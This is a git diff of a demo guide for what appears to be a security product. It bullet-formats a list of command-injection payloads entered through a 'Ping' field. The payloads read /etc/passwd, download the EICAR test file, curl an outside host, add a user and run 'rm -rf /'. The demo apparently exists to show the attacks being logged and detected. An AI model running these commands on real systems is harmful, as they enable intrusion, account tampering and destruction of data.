@@ -19,14 +19,14 @@
 ## Phase3 - Executing the Demo
 - Command Injection Menu
 -- Use the "Ping" field to execute the attacks below:
-127.0.0.1| python http://target-ip/hello "command"
-127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
-127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"
-127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
-127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
-127.0.0.1| python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
-127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
-127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"
+- 127.0.0.1| python http://target-ip/hello "command"
+- 127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
+- 127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"
+- 127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
+- 127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
+- 127.0.0.1| python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
+- 127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
+- 127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"
 
 ## Phase3 - Deep Security Logs
 Check the DS Logs
